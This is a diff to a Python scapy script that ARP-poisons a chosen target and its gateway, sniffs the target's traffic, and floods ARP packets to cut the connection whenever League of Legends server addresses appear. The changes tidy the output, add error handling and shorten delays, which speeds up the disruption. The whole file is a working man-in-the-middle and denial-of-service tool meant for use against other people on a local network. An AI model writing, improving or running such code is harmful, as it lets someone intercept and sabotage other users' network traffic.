@@ -1,15 +1,20 @@
-#192.64.168.0 - 192.64.175.255
-import time, sys, argparse
-from scapy.all import *
+import time, sys
 def LeagueCanceller(pkt, targets, interface, MACs):
     print(pkt.summary())
-    print(f'The destination ip is {pkt[IP].dst}')
-    print(f'The source ip is {pkt[IP].src}')
-    if(isLeagueIP(pkt[IP].dst) or isLeagueIP(pkt[IP].src)):
-        while 1:
-            print("FUCK YOU DWEEB")
-            print(f'the targets are {targets} and the interface is {interface}')
-            DDoSButBased(targets, interface, MACs)
+    # print(f'The destination ip is {pkt[IP].dst}')
+    # print(f'The source ip is {pkt[IP].src}')
+    try:
+        if(isLeagueIP(pkt[IP].dst) or isLeagueIP(pkt[IP].src)):
+            while 1:
+                print("FUBBERNUCK YOU DWEEB")
+                print(f'the targets are {targets} and the interface is {interface}')
+                DDoSButBased(targets, interface, MACs)
+    except Exception:
+        # Non-TCP packet detected. Don't worry about it.
+        return
+
+
+
 class PreAttack(object):
     def __init__(self, targ, iface):
         self.target = targ
@@ -42,7 +47,7 @@ class Attack(object):
             
 def Rosie(interface, gWayT, target, fwd):
     if ((not target) or (not gWayT)):
-        print("Fucking add some arguments damn\n")
+        print("FUBBERNUCKing add some arguments damn\n")
         sys.exit(1)
     #Setting up attack
     targets = [gWayT, target]
@@ -50,14 +55,14 @@ def Rosie(interface, gWayT, target, fwd):
         MACs = [PreAttack(targets[0], interface).getMacNCheese(), PreAttack(targets[1], interface).getMacNCheese()] 
         print('[POGGED]')
     except Exception:
-        print('[FUCK]\n no address(es)')
-        sys.exit(1);
+        print('[FUBBERNUCK]\n no address(es)')
+        sys.exit(1)
     try:
         if fwd:
             PreAttack.togggleIPForward().enableIPForward()
             print("[POGGED]")
     except IOError:
-        print('[FUCK]')
+        print('[FUBBERNUCK]')
         try:
             choice = raw_input('Proceed? [y/N]').strip().lower()[0]
             if choice == 'y':
@@ -75,15 +80,16 @@ def Rosie(interface, gWayT, target, fwd):
        try:
            try:
                Attack(targets, interface).KuzcosPoison(MACs)
-               sniff(count=5, prn=lambda x:LeagueCanceller(x, targets, interface, MACs), filter=f'host {targets[1]}')
+               sniff(count=10, prn=lambda x:LeagueCanceller(x, targets, interface, MACs), filter=f'host {targets[1]}')
                #sniff(prn=lambda x:x.summary(), count=1)
-           except Exception:
+           except Exception as e:
                print('Failed to poison')
+               print(str(e))
                sys.exit(1)
            print('poison sent to %s and %s' %(targets[0], targets[1]))
-           time.sleep(2.5)
+           time.sleep(0.25)
        except KeyboardInterrupt:
-           break;
+           break
     #fix the ARP tables
     DDoSButBased(targets, interface, MACs)
     try:
@@ -93,7 +99,7 @@ def Rosie(interface, gWayT, target, fwd):
             PreAttack.togggleIPForward().disableIPForward()
             print('[POGGED]')
     except IOError:
-        print('[FUCK]')
+        print('[FUBBERNUCK]')
 
 def DDoSButBased(targets, interface, MACs):
     for i in range(0,16):
@@ -101,9 +107,9 @@ def DDoSButBased(targets, interface, MACs):
             Attack(targets, interface).FixItFelix(MACs)
             #sniff(prn=lambda x:x.summary(), count=1)
         except(Exception, KeyboardInterrupt):
-            print('[FUCK]')
+            print('[FUBBERNUCK]')
             sys.exit(1)
-        time.sleep(2)
+        time.sleep(0.25)
     print('[POGGED]')
 
 def isLeagueIP(ipAddr):
